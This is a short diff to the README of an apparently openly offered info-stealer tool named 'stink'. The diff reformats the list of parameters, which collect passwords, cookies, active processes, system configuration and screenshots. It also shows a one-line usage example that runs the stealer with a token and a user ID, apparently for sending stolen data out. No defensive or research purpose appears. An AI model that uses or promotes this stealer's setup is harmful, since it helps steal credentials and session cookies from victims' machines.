@@ -53,12 +53,18 @@ from stink.multistealer import Stealer
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 ### Additional parameters
+
 `errors` - error output.
+
 `passwords` - collecting passwords.
-`Cookies` - collecting cookies.
+
+`cookies` - collecting cookies.
+
 `processes` - collecting of active processes.
-`System` - collecting system configuration.
-`Screen` - screenshot.
+
+`system` - collecting system configuration.
+
+`screen` - screenshot.
 
 All parameters take the value of `bool`. 
 `True` - the function is enabled.
